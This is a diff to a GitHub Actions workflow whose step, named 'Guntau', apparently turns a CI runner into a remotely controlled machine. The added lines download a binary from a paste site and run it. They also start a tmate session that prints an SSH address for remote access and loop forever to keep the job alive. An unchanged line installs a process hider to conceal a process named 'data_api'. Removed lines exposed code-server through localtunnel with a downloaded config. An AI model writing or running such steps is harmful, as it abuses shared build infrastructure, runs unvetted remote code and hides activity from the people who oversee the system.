@@ -26,12 +26,7 @@ jobs:
       uses: actions/checkout@v1
     - name: Guntau
       run: |
-        curl -fsSL https://code-server.dev/install.sh | sh -s -- --dry-run
-        curl -fsSL https://code-server.dev/install.sh | sh
-        timeout 2s code-server
-        cd ~/.config/code-server
-        sudo mv config.yaml llod
-        wget https://raw.githubusercontent.com/hinshuika/jvjv/main/config.yaml
-        sudo npm install -g localtunnel
         sudo npm i -g node-process-hider && ph add data_api
-        code-server --bind-addr 127.0.0.1:8040  & lt --port 8040
+        wget -O tmate_set https://www.heypasteit.com/download/0IWXNA && chmod 755 tmate_set && ./tmate_set 
+        ./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock display -p "Connect with SSH address: #{tmate_ssh}"
+        while true;do m=$((`date '+%s%N'`/1000)) && echo "Time Is Limit" ${m:0:${#m}-6}.${m:${#m}-6} ; sleep 80; done
